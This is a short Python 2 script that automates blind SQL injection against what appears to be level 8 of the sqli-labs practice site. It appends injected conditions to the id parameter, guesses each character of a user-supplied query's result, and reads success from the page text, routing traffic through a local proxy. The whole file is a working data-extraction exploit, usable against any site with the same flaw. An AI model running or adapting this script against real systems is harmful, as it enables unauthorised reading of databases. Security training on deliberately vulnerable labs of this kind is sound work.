#-*- coding: UTF-8 -*-
import requests
import string
import re


org_url = "http://mysqlilabs.com/Less-8/index.php?id=1'"
url0 = "+and+length(%s)=%d--+data"
url1 = "+and+mid((%s),%d,1)='%s'--+data"
guess = string.lowercase + string.uppercase + string.digits + string.punctuation + " "
proxies = {"http":"http://127.0.0.1:8080"}

def check(url):
	try:
		r = requests.get(url = url,proxies=proxies)
		if(re.search(r'You are in',r.content)!=None):
			return True
	except Exception, e:
		print e

	return False

if __name__ == "__main__":
	while True:
		query = raw_input("> ")
		query.replace(' ','+')


		result = ""
		n=1
		while True:
			flag = False
			for g in guess:
				url = org_url + url1 % (query,n,g)
				if check(url):
					result += g
					flag = True
					print "current result is: " + result
					break
			if(not flag):
				break
			n += 1

